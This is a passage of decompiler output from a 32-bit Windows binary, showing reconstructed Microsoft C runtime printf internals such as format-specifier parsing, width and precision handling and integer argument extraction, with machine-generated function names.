  int v9; // esi
  int v10; // eax
  int v11; // [esp+4h] [ebp-484h] BYREF
  char v12[12]; // [esp+8h] [ebp-480h] BYREF
  int v13; // [esp+14h] [ebp-474h]
  int v14[2]; // [esp+18h] [ebp-470h] BYREF
  int v15; // [esp+20h] [ebp-468h]
  int v16; // [esp+24h] [ebp-464h]
  int *v17; // [esp+28h] [ebp-460h] BYREF
  char v18[64]; // [esp+2Ch] [ebp-45Ch] BYREF
  char v19[1040]; // [esp+6Ch] [ebp-41Ch] BYREF
  int v20; // [esp+47Ch] [ebp-Ch]

  v17 = a3;
  if ( !a5 || a4 && !a3 )
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return -1;
  }
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v11, a6);
  v16 = 0;
  v8 = v17;
  v13 = a1 & 2;
  v14[0] = (int)v17;
  v14[1] = a4;
  v15 = 0;
  if ( (a1 & 2) != 0 || (LOBYTE(v16) = 0, !v17) )
    LOBYTE(v16) = 1;
  v17 = v14;
  unknown_libname_12(&v17, a1, a2, a5, v12, a7);
  v20 = 0;
  v9 = sub_41AA92((int)v18);
  if ( !v8 )
    goto LABEL_22;
  if ( (a1 & 1) == 0 )
  {
    if ( v13 )
    {
      if ( !a4 )
        goto LABEL_22;
      if ( v9 < 0 )
      {
        *(_BYTE *)v8 = 0;
        goto LABEL_22;
      }
      v10 = v15;
      if ( v15 != a4 )
      {
LABEL_21:
        *((_BYTE *)v8 + v10) = 0;
        goto LABEL_22;
      }
    }
    else
    {
      if ( !a4 )
      {
LABEL_26:
        v9 = -1;
        goto LABEL_22;
      }
      v10 = v15;
      if ( v15 != a4 )
        goto LABEL_21;
      v9 = -2;
    }
    *((_BYTE *)v8 + a4 - 1) = 0;
    goto LABEL_22;
  }
  if ( !a4 && v9 )
    goto LABEL_26;
  v10 = v15;
  if ( v15 != a4 )
    goto LABEL_21;
  if ( v9 >= 0 && v9 > a4 )
    goto LABEL_26;
LABEL_22:
  __crt_stdio_output::formatting_buffer::~formatting_buffer((__crt_stdio_output::formatting_buffer *)v19);
  if ( v12[8] )
    *(_DWORD *)(v11 + 848) &= ~2u;
  return v9;
}
// 41A6A9: using guessed type _DWORD __stdcall unknown_libname_12(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 41A0B3: using guessed type char var_45C[64];
// 41A0B3: using guessed type char var_41C[1040];

//----- (0041A233) --------------------------------------------------------
int __cdecl sub_41A233(int a1, int a2, int *a3, unsigned int a4, int a5, struct __crt_locale_pointers *a6, int a7)
{
  int *v8; // edi
  int v9; // esi
  int v10; // eax
  int v11; // [esp+4h] [ebp-484h] BYREF
  char v12[12]; // [esp+8h] [ebp-480h] BYREF
  int v13; // [esp+14h] [ebp-474h]
  int v14[2]; // [esp+18h] [ebp-470h] BYREF
  int v15; // [esp+20h] [ebp-468h]
  int v16; // [esp+24h] [ebp-464h]
  int *v17; // [esp+28h] [ebp-460h] BYREF
  char v18[64]; // [esp+2Ch] [ebp-45Ch] BYREF
  char v19[1040]; // [esp+6Ch] [ebp-41Ch] BYREF
  int v20; // [esp+47Ch] [ebp-Ch]

  v17 = a3;
  if ( !a5 || a4 && !a3 )
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return -1;
  }
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v11, a6);
  v16 = 0;
  v8 = v17;
  v13 = a1 & 2;
  v14[0] = (int)v17;
  v14[1] = a4;
  v15 = 0;
  if ( (a1 & 2) != 0 || (LOBYTE(v16) = 0, !v17) )
    LOBYTE(v16) = 1;
  v17 = v14;
  unknown_libname_12(&v17, a1, a2, a5, v12, a7);
  v20 = 0;
  v9 = sub_41ABBA((int)v18);
  if ( !v8 )
    goto LABEL_22;
  if ( (a1 & 1) == 0 )
  {
    if ( v13 )
    {
      if ( !a4 )
        goto LABEL_22;
      if ( v9 < 0 )
      {
        *(_BYTE *)v8 = 0;
        goto LABEL_22;
      }
      v10 = v15;
      if ( v15 != a4 )
      {
LABEL_21:
        *((_BYTE *)v8 + v10) = 0;
        goto LABEL_22;
      }
    }
    else
    {
      if ( !a4 )
      {
LABEL_26:
        v9 = -1;
        goto LABEL_22;
      }
      v10 = v15;
      if ( v15 != a4 )
        goto LABEL_21;
      v9 = -2;
    }
    *((_BYTE *)v8 + a4 - 1) = 0;
    goto LABEL_22;
  }
  if ( !a4 && v9 )
    goto LABEL_26;
  v10 = v15;
  if ( v15 != a4 )
    goto LABEL_21;
  if ( v9 >= 0 && v9 > a4 )
    goto LABEL_26;
LABEL_22:
  __crt_stdio_output::formatting_buffer::~formatting_buffer((__crt_stdio_output::formatting_buffer *)v19);
  if ( v12[8] )
    *(_DWORD *)(v11 + 848) &= ~2u;
  return v9;
}
// 41A6A9: using guessed type _DWORD __stdcall unknown_libname_12(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 41A233: using guessed type char var_45C[64];
// 41A233: using guessed type char var_41C[1040];

//----- (0041A976) --------------------------------------------------------
int __thiscall sub_41A976(int this)
{
  int v3; // eax
  char v4; // al
  char v5; // al

  if ( !(unsigned __int8)unknown_libname_25(this + 1096) )
    return -1;
  if ( *(_DWORD *)(this + 16) )
  {
LABEL_21:
    while ( ++*(_DWORD *)(this + 1104) != 2 )
    {
      *(_DWORD *)(this + 56) = 0;
      *(_DWORD *)(this + 28) = 0;
      while ( 1 )
      {
        v5 = **(_BYTE **)(this + 16);
        *(_BYTE *)(this + 49) = v5;
        if ( !v5 )
          break;
        ++*(_DWORD *)(this + 16);
        if ( *(int *)(this + 24) < 0 )
          goto LABEL_21;
        v3 = unknown_libname_14(*(_BYTE *)(this + 49), *(_DWORD *)(this + 28));
        *(_DWORD *)(this + 28) = v3;
        if ( v3 == 8 )
          goto LABEL_4;
        switch ( v3 )
        {
          case 0:
            v4 = sub_41AD13((void *)this);
            break;
          case 1:
            *(_DWORD *)(this + 40) = -1;
            *(_DWORD *)(this + 36) = 0;
            *(_BYTE *)(this + 48) = 0;
            *(_DWORD *)(this + 32) = 0;
            *(_DWORD *)(this + 44) = 0;
            *(_BYTE *)(this + 60) = 0;
            continue;
          case 2:
            v4 = unknown_libname_17(this);
            break;
          case 3:
            v4 = sub_41B5DE(this);
            break;
          case 4:
            *(_DWORD *)(this + 40) = 0;
            continue;
          case 5:
            v4 = sub_41AE84(this);
            break;
          case 6:
            v4 = sub_41AEAC((_BYTE *)this);
            break;
          case 7:
            v4 = sub_41B18E(this);
            break;
          default:
            return -1;
        }
        if ( !v4 )
          return -1;
      }
      ++*(_DWORD *)(this + 16);
    }
    return *(_DWORD *)(this + 24);
  }
  else
  {
LABEL_4:
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return -1;
  }
}
// 41A83B: using guessed type _DWORD __stdcall unknown_libname_14(char, _DWORD);
// 41ACD6: using guessed type int __thiscall unknown_libname_17(_DWORD);
// 41BB27: using guessed type int __thiscall unknown_libname_25(_DWORD);

//----- (0041AA92) --------------------------------------------------------
int __thiscall sub_41AA92(int this)
{
  int v3; // eax
  char v4; // al
  char v5; // al

  if ( !(unsigned __int8)unknown_libname_32(this + 1096) )
    return -1;
  if ( *(_DWORD *)(this + 16) )
  {
    while ( ++*(_DWORD *)(this + 1104) != 2 )
    {
      *(_DWORD *)(this + 56) = 0;
      *(_DWORD *)(this + 28) = 0;
      while ( 1 )
      {
        v5 = **(_BYTE **)(this + 16);
        *(_BYTE *)(this + 49) = v5;
        if ( !v5 )
          break;
        ++*(_DWORD *)(this + 16);
        if ( *(int *)(this + 24) < 0 )
          goto LABEL_21;
        v3 = unknown_libname_15(*(_BYTE *)(this + 49), *(_DWORD *)(this + 28));
        *(_DWORD *)(this + 28) = v3;
        if ( v3 == 8 )
          goto LABEL_4;
        switch ( v3 )
        {
          case 0:
            v4 = sub_41AD32((char *)this);
            break;
          case 1:
            *(_DWORD *)(this + 40) = -1;
            *(_DWORD *)(this + 36) = 0;
            *(_BYTE *)(this + 48) = 0;
            *(_DWORD *)(this + 32) = 0;
            *(_DWORD *)(this + 44) = 0;
            *(_BYTE *)(this + 60) = 0;
            continue;
          case 2:
            v4 = unknown_libname_17(this);
            break;
          case 3:
            v4 = sub_41B5DE(this);
            break;
          case 4:
            *(_DWORD *)(this + 40) = 0;
            continue;
          case 5:
            v4 = sub_41AE84(this);
            break;
          case 6:
            v4 = sub_41B01D((_BYTE *)this);
            break;
          case 7:
            v4 = sub_41B3B6(this);
            break;
          default:
            return -1;
        }
        if ( !v4 )
          return -1;
      }
      ++*(_DWORD *)(this + 16);
LABEL_21:
      if ( !(unsigned __int8)unknown_libname_26(this) )
        return -1;
    }
    return *(_DWORD *)(this + 24);
  }
  else
  {
LABEL_4:
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return -1;
  }
}
// 41A86D: using guessed type _DWORD __stdcall unknown_libname_15(char, _DWORD);
// 41ACD6: using guessed type int __thiscall unknown_libname_17(_DWORD);
// 41BB48: using guessed type int __thiscall unknown_libname_26(_DWORD);
// 41F0D6: using guessed type int __thiscall unknown_libname_32(_DWORD);

//----- (0041ABBA) --------------------------------------------------------
int __thiscall sub_41ABBA(int this)
{
  int v3; // eax
  char v4; // al
  char v5; // al

  if ( !(unsigned __int8)unknown_libname_32(this + 1096) )
    return -1;
  if ( *(_DWORD *)(this + 16) )
  {
LABEL_21:
    while ( ++*(_DWORD *)(this + 1104) != 2 )
    {
      *(_DWORD *)(this + 56) = 0;
      *(_DWORD *)(this + 28) = 0;
      while ( 1 )
      {
        v5 = **(_BYTE **)(this + 16);
        *(_BYTE *)(this + 49) = v5;
        if ( !v5 )
          break;
        ++*(_DWORD *)(this + 16);
        if ( *(int *)(this + 24) < 0 )
          goto LABEL_21;
        v3 = unknown_libname_14(*(_BYTE *)(this + 49), *(_DWORD *)(this + 28));
        *(_DWORD *)(this + 28) = v3;
        if ( v3 == 8 )
          goto LABEL_4;
        switch ( v3 )
        {
          case 0:
            v4 = sub_41AD32((char *)this);
            break;
          case 1:
            *(_DWORD *)(this + 40) = -1;
            *(_DWORD *)(this + 36) = 0;
            *(_BYTE *)(this + 48) = 0;
            *(_DWORD *)(this + 32) = 0;
            *(_DWORD *)(this + 44) = 0;
            *(_BYTE *)(this + 60) = 0;
            continue;
          case 2:
            v4 = unknown_libname_17(this);
            break;
          case 3:
            v4 = sub_41B5DE(this);
            break;
          case 4:
            *(_DWORD *)(this + 40) = 0;
            continue;
          case 5:
            v4 = sub_41AE84(this);
            break;
          case 6:
            v4 = sub_41B01D((_BYTE *)this);
            break;
          case 7:
            v4 = sub_41B3B6(this);
            break;
          default:
            return -1;
        }
        if ( !v4 )
          return -1;
      }
      ++*(_DWORD *)(this + 16);
    }
    return *(_DWORD *)(this + 24);
  }
  else
  {
LABEL_4:
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return -1;
  }
}
// 41A83B: using guessed type _DWORD __stdcall unknown_libname_14(char, _DWORD);
// 41ACD6: using guessed type int __thiscall unknown_libname_17(_DWORD);
// 41F0D6: using guessed type int __thiscall unknown_libname_32(_DWORD);

//----- (0041AD13) --------------------------------------------------------
char __thiscall sub_41AD13(void *this)
{
  if ( sub_41AD51((int)this) )
    return 1;
  *_errno() = 22;
  _invalid_parameter_noinfo();
  return 0;
}

//----- (0041AD32) --------------------------------------------------------
char __thiscall sub_41AD32(char *this)
{
  if ( sub_41AD8D(this) )
    return 1;
  *_errno() = 22;
  _invalid_parameter_noinfo();
  return 0;
}

//----- (0041AD51) --------------------------------------------------------
char __thiscall sub_41AD51(int this)
{
  char result; // al

  result = unknown_libname_18(0);
  if ( result )
  {
    if ( (unsigned __int8)__crt_stdio_output::stream_output_adapter<char>::write_character_without_count_update(*(_BYTE *)(this + 49)) )
      ++*(_DWORD *)(this + 24);
    else
      *(_DWORD *)(this + 24) = -1;
    return 1;
  }
  return result;
}
// 41ADB7: using guessed type _DWORD __stdcall unknown_libname_18(_DWORD);
// 41BC2E: using guessed type _DWORD __stdcall __crt_stdio_output::stream_output_adapter<char>::write_character_without_count_update(char);

//----- (0041AD8D) --------------------------------------------------------
char __thiscall sub_41AD8D(char *this)
{
  char result; // al

  result = unknown_libname_19(0);
  if ( result )
  {
    __crt_stdio_output::string_output_adapter<char>::write_character(this[49], this + 24);
    return 1;
  }
  return result;
}
// 41AE28: using guessed type _DWORD __stdcall unknown_libname_19(_DWORD);
// 41BBEC: using guessed type _DWORD __stdcall __crt_stdio_output::string_output_adapter<char>::write_character(char, _DWORD);

//----- (0041AE84) --------------------------------------------------------
char __thiscall sub_41AE84(int this)
{
  int v2; // eax

  if ( *(_BYTE *)(this + 49) != 42 )
    return unknown_libname_16(this + 40);
  *(_DWORD *)(this + 20) += 4;
  v2 = *(_DWORD *)(*(_DWORD *)(this + 20) - 4);
  *(_DWORD *)(this + 40) = v2;
  if ( v2 < 0 )
    *(_DWORD *)(this + 40) = -1;
  return 1;
}
// 41A8FE: using guessed type _DWORD __stdcall unknown_libname_16(_DWORD);

//----- (0041AEAC) --------------------------------------------------------
char __thiscall sub_41AEAC(_BYTE *this)
{
  char v1; // al
  _BYTE *v3; // eax
  char *v4; // edx
  char v5; // al
  _BYTE *v6; // eax

  v1 = this[49];
  if ( v1 == 70 )
  {
    if ( (*(_DWORD *)this & 8) == 0 )
    {
      *((_DWORD *)this + 7) = 7;
      return sub_41B18E((int)this);
    }
    return 1;
  }
  if ( v1 == 78 )
  {
    if ( (*(_DWORD *)this & 8) == 0 )
    {
      *((_DWORD *)this + 7) = 8;
LABEL_7:
      *_errno() = 22;
      _invalid_parameter_noinfo();
      return 0;
    }
  }
  else
  {
    if ( *((_DWORD *)this + 11) )
      goto LABEL_7;
    if ( v1 > 106 )
    {
      switch ( v1 )
      {
        case 'l':
          v6 = (_BYTE *)*((_DWORD *)this + 4);
          if ( *v6 == 108 )
          {
            *((_DWORD *)this + 11) = 4;
            *((_DWORD *)this + 4) = v6 + 1;
          }
          else
          {
            *((_DWORD *)this + 11) = 3;
          }
          break;
        case 't':
          *((_DWORD *)this + 11) = 7;
          break;
        case 'w':
          *((_DWORD *)this + 11) = 12;
          break;
        case 'z':
          *((_DWORD *)this + 11) = 6;
          break;
      }
    }
    else
    {
      switch ( v1 )
      {
        case 'j':
          *((_DWORD *)this + 11) = 5;
          break;
        case 'I':
          v4 = (char *)*((_DWORD *)this + 4);
          v5 = *v4;
          if ( *v4 == 51 )
          {
            if ( v4[1] == 50 )
            {
              *((_DWORD *)this + 11) = 10;
              *((_DWORD *)this + 4) = v4 + 2;
            }
          }
          else if ( v5 == 54 )
          {
            if ( v4[1] == 52 )
            {
              *((_DWORD *)this + 11) = 11;
              *((_DWORD *)this + 4) = v4 + 2;
            }
          }
          else if ( v5 == 100 || v5 == 105 || v5 == 111 || v5 == 117 || v5 == 120 || v5 == 88 )
          {
            *((_DWORD *)this + 11) = 9;
          }
          break;
        case 'L':
          *((_DWORD *)this + 11) = 8;
          break;
        case 'T':
          *((_DWORD *)this + 11) = 13;
          break;
        case 'h':
          v3 = (_BYTE *)*((_DWORD *)this + 4);
          if ( *v3 == 104 )
          {
            *((_DWORD *)this + 11) = 1;
            *((_DWORD *)this + 4) = v3 + 1;
          }
          else
          {
            *((_DWORD *)this + 11) = 2;
          }
          break;
      }
    }
  }
  return 1;
}

//----- (0041B01D) --------------------------------------------------------
char __thiscall sub_41B01D(_BYTE *this)
{
  char v1; // al
  _BYTE *v3; // eax
  char *v4; // edx
  char v5; // al
  _BYTE *v6; // eax

  v1 = this[49];
  if ( v1 == 70 )
  {
    if ( (*(_DWORD *)this & 8) == 0 )
    {
      *((_DWORD *)this + 7) = 7;
      return sub_41B3B6((int)this);
    }
    return 1;
  }
  if ( v1 == 78 )
  {
    if ( (*(_DWORD *)this & 8) == 0 )
    {
      *((_DWORD *)this + 7) = 8;
LABEL_7:
      *_errno() = 22;
      _invalid_parameter_noinfo();
      return 0;
    }
  }
  else
  {
    if ( *((_DWORD *)this + 11) )
      goto LABEL_7;
    if ( v1 > 106 )
    {
      switch ( v1 )
      {
        case 'l':
          v6 = (_BYTE *)*((_DWORD *)this + 4);
          if ( *v6 == 108 )
          {
            *((_DWORD *)this + 11) = 4;
            *((_DWORD *)this + 4) = v6 + 1;
          }
          else
          {
            *((_DWORD *)this + 11) = 3;
          }
          break;
        case 't':
          *((_DWORD *)this + 11) = 7;
          break;
        case 'w':
          *((_DWORD *)this + 11) = 12;
          break;
        case 'z':
          *((_DWORD *)this + 11) = 6;
          break;
      }
    }
    else
    {
      switch ( v1 )
      {
        case 'j':
          *((_DWORD *)this + 11) = 5;
          break;
        case 'I':
          v4 = (char *)*((_DWORD *)this + 4);
          v5 = *v4;
          if ( *v4 == 51 )
          {
            if ( v4[1] == 50 )
            {
              *((_DWORD *)this + 11) = 10;
              *((_DWORD *)this + 4) = v4 + 2;
            }
          }
          else if ( v5 == 54 )
          {
            if ( v4[1] == 52 )
            {
              *((_DWORD *)this + 11) = 11;
              *((_DWORD *)this + 4) = v4 + 2;
            }
          }
          else if ( v5 == 100 || v5 == 105 || v5 == 111 || v5 == 117 || v5 == 120 || v5 == 88 )
          {
            *((_DWORD *)this + 11) = 9;
          }
          break;
        case 'L':
          *((_DWORD *)this + 11) = 8;
          break;
        case 'T':
          *((_DWORD *)this + 11) = 13;
          break;
        case 'h':
          v3 = (_BYTE *)*((_DWORD *)this + 4);
          if ( *v3 == 104 )
          {
            *((_DWORD *)this + 11) = 1;
            *((_DWORD *)this + 4) = v3 + 1;
          }
          else
          {
            *((_DWORD *)this + 11) = 2;
          }
          break;
      }
    }
  }
  return 1;
}

//----- (0041B18E) --------------------------------------------------------
char __thiscall sub_41B18E(int this)
{
  char v2; // bl
  int v3; // eax
  char v4; // al
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // edx
  int v11; // edi
  char v12; // cl
  bool v13; // al
  char v14; // al
  int v15; // ebx
  char v16; // [esp-4h] [ebp-10h]
  __int16 v17; // [esp+8h] [ebp-4h] BYREF
  char v18; // [esp+Ah] [ebp-2h]

  v2 = 1;
  v3 = *(char *)(this + 49);
  if ( v3 <= 100 )
  {
    if ( v3 != 100 )
    {
      if ( v3 > 88 )
      {
        v6 = v3 - 90;
        if ( !v6 )
        {
          v4 = unknown_libname_20(this);
          goto LABEL_11;
        }
        v7 = v6 - 7;
        if ( !v7 )
          goto LABEL_31;
        if ( v7 != 2 )
          return 0;
        goto LABEL_18;
      }
      if ( v3 != 88 )
      {
        if ( v3 != 65 )
        {
          if ( v3 != 67 )
          {
            if ( v3 <= 68 )
              return 0;
            if ( v3 > 71 )
            {
              if ( v3 == 83 )
              {
LABEL_10:
                v4 = unknown_libname_24(this);
                goto LABEL_11;
              }
              return 0;
            }
            goto LABEL_31;
          }
LABEL_18:
          v4 = unknown_libname_22(0);
          goto LABEL_11;
        }
LABEL_31:
        v4 = unknown_libname_21(this);
        goto LABEL_11;
      }
      v16 = 1;
LABEL_14:
      v4 = sub_41B8B8(this, 16, v16);
      goto LABEL_11;
    }
    goto LABEL_28;
  }
  if ( v3 > 112 )
  {
    v8 = v3 - 115;
    if ( !v8 )
      goto LABEL_10;
    v9 = v8 - 2;
    if ( v9 )
    {
      if ( v9 != 3 )
        return 0;
      v16 = 0;
      goto LABEL_14;
    }
    goto LABEL_29;
  }
  if ( v3 == 112 )
  {
    v4 = sub_41BA9C((_DWORD *)this);
    goto LABEL_11;
  }
  if ( v3 <= 103 )
    goto LABEL_31;
  switch ( v3 )
  {
    case 'i':
LABEL_28:
      *(_DWORD *)(this + 32) |= 0x10u;
LABEL_29:
      v4 = sub_41B8B8(this, 10, 0);
      break;
    case 'n':
      v4 = unknown_libname_23(this);
      break;
    case 'o':
      v4 = sub_41BA7D((_DWORD *)this);
      break;
    default:
      return 0;
  }
LABEL_11:
  if ( !v4 )
    return 0;
  if ( *(_BYTE *)(this + 48) )
    return 1;
  v10 = *(_DWORD *)(this + 32);
  v17 = 0;
  v11 = 0;
  v18 = 0;
  if ( (v10 & 0x10) != 0 )
  {
    if ( (v10 & 0x40) != 0 )
    {
      LOBYTE(v17) = 45;
LABEL_46:
      v11 = 1;
      goto LABEL_47;
    }
    if ( (v10 & 1) != 0 )
    {
      LOBYTE(v17) = 43;
      goto LABEL_46;
    }
    if ( (v10 & 2) != 0 )
    {
      LOBYTE(v17) = 32;
      goto LABEL_46;
    }
  }
LABEL_47:
  v12 = *(_BYTE *)(this + 49);
  if ( v12 != 120 && v12 != 88 || (v10 & 0x20) == 0 )
    v2 = 0;
  v13 = v12 == 97 || v12 == 65;
  if ( v2 || v13 )
  {
    *((_BYTE *)&v17 + v11) = 48;
    if ( v12 == 88 || v12 == 65 )
      v14 = 88;
    else
      v14 = 120;
    *((_BYTE *)&v17 + v11 + 1) = v14;
    v11 += 2;
  }
  v15 = *(_DWORD *)(this + 36) - *(_DWORD *)(this + 56) - v11;
  if ( (v10 & 0xC) == 0 )
    __crt_stdio_output::write_multiple_characters<__crt_stdio_output::stream_output_adapter<char>,char>(
      this + 1096,
      32,
      v15,
      this + 24);
  __crt_stdio_output::stream_output_adapter<char>::write_string(&v17, v11, this + 24, this + 12);
  if ( (*(_DWORD *)(this + 32) & 8) != 0 && (*(_DWORD *)(this + 32) & 4) == 0 )
    __crt_stdio_output::write_multiple_characters<__crt_stdio_output::stream_output_adapter<char>,char>(
      this + 1096,
      48,
      v15,
      this + 24);
  unknown_libname_27(0);
  if ( *(int *)(this + 24) >= 0 && (*(_DWORD *)(this + 32) & 4) != 0 )
    __crt_stdio_output::write_multiple_characters<__crt_stdio_output::stream_output_adapter<char>,char>(
      this + 1096,
      32,
      v15,
      this + 24);
  return 1;
}
// 41A600: using guessed type _DWORD __cdecl __crt_stdio_output::write_multiple_characters<__crt_stdio_output::stream_output_adapter<char>,char>(_DWORD, _DWORD, _DWORD, _DWORD);
// 41B667: using guessed type int __thiscall unknown_libname_20(_DWORD);
// 41B6CA: using guessed type int __thiscall unknown_libname_21(_DWORD);
// 41B828: using guessed type _DWORD __stdcall unknown_libname_22(_DWORD);
// 41BA09: using guessed type int __thiscall unknown_libname_23(_DWORD);
// 41BAB4: using guessed type int __thiscall unknown_libname_24(_DWORD);
// 41BC63: using guessed type _DWORD __stdcall unknown_libname_27(_DWORD);
// 41BDB5: using guessed type _DWORD __stdcall __crt_stdio_output::stream_output_adapter<char>::write_string(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0041B3B6) --------------------------------------------------------
char __thiscall sub_41B3B6(int this)
{
  char v2; // bl
  int v3; // eax
  char v4; // al
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // edx
  int v11; // edi
  char v12; // cl
  bool v13; // al
  char v14; // al
  int v15; // ebx
  char v16; // [esp-4h] [ebp-10h]
  __int16 Src; // [esp+8h] [ebp-4h] BYREF
  char v18; // [esp+Ah] [ebp-2h]

  v2 = 1;
  v3 = *(char *)(this + 49);
  if ( v3 <= 100 )
  {
    if ( v3 != 100 )
    {
      if ( v3 > 88 )
      {
        v6 = v3 - 90;
        if ( !v6 )
        {
          v4 = unknown_libname_20(this);
          goto LABEL_11;
        }
        v7 = v6 - 7;
        if ( !v7 )
          goto LABEL_31;
        if ( v7 != 2 )
          return 0;
        goto LABEL_18;
      }
      if ( v3 != 88 )
      {
        if ( v3 != 65 )
        {
          if ( v3 != 67 )
          {
            if ( v3 <= 68 )
              return 0;
            if ( v3 > 71 )
            {
              if ( v3 == 83 )
              {
LABEL_10:
                v4 = unknown_libname_24(this);
                goto LABEL_11;
              }
              return 0;
            }
            goto LABEL_31;
          }
LABEL_18:
          v4 = unknown_libname_22(0);
          goto LABEL_11;
        }
LABEL_31:
        v4 = unknown_libname_21(this);
        goto LABEL_11;
      }
      v16 = 1;
LABEL_14:
      v4 = sub_41B8B8(this, 16, v16);
      goto LABEL_11;
    }
    goto LABEL_28;
  }
  if ( v3 > 112 )
  {
    v8 = v3 - 115;
    if ( !v8 )
      goto LABEL_10;
    v9 = v8 - 2;
    if ( v9 )
    {
      if ( v9 != 3 )
        return 0;
      v16 = 0;
      goto LABEL_14;
    }
    goto LABEL_29;
  }
  if ( v3 == 112 )
  {
    v4 = sub_41BA9C((_DWORD *)this);
    goto LABEL_11;
  }
  if ( v3 <= 103 )
    goto LABEL_31;
  switch ( v3 )
  {
    case 'i':
LABEL_28:
      *(_DWORD *)(this + 32) |= 0x10u;
LABEL_29:
      v4 = sub_41B8B8(this, 10, 0);
      break;
    case 'n':
      v4 = unknown_libname_23(this);
      break;
    case 'o':
      v4 = sub_41BA7D((_DWORD *)this);
      break;
    default:
      return 0;
  }
LABEL_11:
  if ( !v4 )
    return 0;
  if ( *(_BYTE *)(this + 48) )
    return 1;
  v10 = *(_DWORD *)(this + 32);
  Src = 0;
  v11 = 0;
  v18 = 0;
  if ( (v10 & 0x10) != 0 )
  {
    if ( (v10 & 0x40) != 0 )
    {
      LOBYTE(Src) = 45;
LABEL_46:
      v11 = 1;
      goto LABEL_47;
    }
    if ( (v10 & 1) != 0 )
    {
      LOBYTE(Src) = 43;
      goto LABEL_46;
    }
    if ( (v10 & 2) != 0 )
    {
      LOBYTE(Src) = 32;
      goto LABEL_46;
    }
  }
LABEL_47:
  v12 = *(_BYTE *)(this + 49);
  if ( v12 != 120 && v12 != 88 || (v10 & 0x20) == 0 )
    v2 = 0;
  v13 = v12 == 97 || v12 == 65;
  if ( v2 || v13 )
  {
    *((_BYTE *)&Src + v11) = 48;
    if ( v12 == 88 || v12 == 65 )
      v14 = 88;
    else
      v14 = 120;
    *((_BYTE *)&Src + v11 + 1) = v14;
    v11 += 2;
  }
  v15 = *(_DWORD *)(this + 36) - *(_DWORD *)(this + 56) - v11;
  if ( (v10 & 0xC) == 0 )
    __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(
      this + 1096,
      32,
      v15,
      this + 24);
  unknown_libname_29(&Src, v11, this + 24, this + 12);
  if ( (*(_DWORD *)(this + 32) & 8) != 0 && (*(_DWORD *)(this + 32) & 4) == 0 )
    __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(
      this + 1096,
      48,
      v15,
      this + 24);
  unknown_libname_28(0);
  if ( *(int *)(this + 24) >= 0 && (*(_DWORD *)(this + 32) & 4) != 0 )
    __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(
      this + 1096,
      32,
      v15,
      this + 24);
  return 1;
}
// 41A636: using guessed type _DWORD __cdecl __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(_DWORD, _DWORD, _DWORD, _DWORD);
// 41B667: using guessed type int __thiscall unknown_libname_20(_DWORD);
// 41B6CA: using guessed type int __thiscall unknown_libname_21(_DWORD);
// 41B828: using guessed type _DWORD __stdcall unknown_libname_22(_DWORD);
// 41BA09: using guessed type int __thiscall unknown_libname_23(_DWORD);
// 41BAB4: using guessed type int __thiscall unknown_libname_24(_DWORD);
// 41BD0C: using guessed type _DWORD __stdcall unknown_libname_28(_DWORD);

//----- (0041B5DE) --------------------------------------------------------
char __thiscall sub_41B5DE(int this)
{
  int v2; // eax

  if ( *(_BYTE *)(this + 49) != 42 )
    return unknown_libname_16(this + 36);
  *(_DWORD *)(this + 20) += 4;
  v2 = *(_DWORD *)(*(_DWORD *)(this + 20) - 4);
  *(_DWORD *)(this + 36) = v2;
  if ( v2 < 0 )
  {
    *(_DWORD *)(this + 32) |= 4u;
    *(_DWORD *)(this + 36) = -v2;
  }
  return 1;
}
// 41A8FE: using guessed type _DWORD __stdcall unknown_libname_16(_DWORD);

//----- (0041B8B8) --------------------------------------------------------
char __thiscall sub_41B8B8(int this, int a2, char a3)
{
  int v4; // eax
  int v6; // eax
  int v7; // edi
  int v8; // ebx
  int v9; // eax
  bool v10; // zf
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // eax
  int v17; // [esp-4h] [ebp-14h]
  int v18; // [esp+Ch] [ebp-4h]

  v4 = __crt_stdio_output::to_integer_size(*(_DWORD *)(this + 44));
  v18 = v4;
  switch ( v4 )
  {
    case 1:
      v15 = *(_DWORD *)(this + 32);
      *(_DWORD *)(this + 20) += 4;
      v10 = (v15 & 0x10) == 0;
      v16 = *(_DWORD *)(this + 20);
      if ( v10 )
        v12 = *(unsigned __int8 *)(v16 - 4);
      else
        v12 = *(char *)(v16 - 4);
      goto LABEL_16;
    case 2:
      v13 = *(_DWORD *)(this + 32);
      *(_DWORD *)(this + 20) += 4;
      v10 = (v13 & 0x10) == 0;
      v14 = *(_DWORD *)(this + 20);
      if ( v10 )
        v12 = *(unsigned __int16 *)(v14 - 4);
      else
        v12 = *(__int16 *)(v14 - 4);
LABEL_16:
      v8 = v12 >> 31;
      v7 = v12;
      goto LABEL_17;
    case 4:
      v9 = *(_DWORD *)(this + 32);
      *(_DWORD *)(this + 20) += 4;
      v10 = (v9 & 0x10) == 0;
      v11 = *(_DWORD *)(this + 20);
      if ( v10 )
      {
        v7 = *(_DWORD *)(v11 - 4);
        v8 = 0;
        goto LABEL_17;
      }
      v12 = *(_DWORD *)(v11 - 4);
      goto LABEL_16;
  }
  if ( v4 != 8 )
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 0;
  }
  *(_DWORD *)(this + 20) += 8;
  v6 = *(_DWORD *)(this + 20);
  v7 = *(_DWORD *)(v6 - 8);
  v8 = *(_DWORD *)(v6 - 4);
LABEL_17:
  if ( (*(_DWORD *)(this + 32) & 0x10) != 0 && v8 < 0 )
  {
    v7 = -v7;
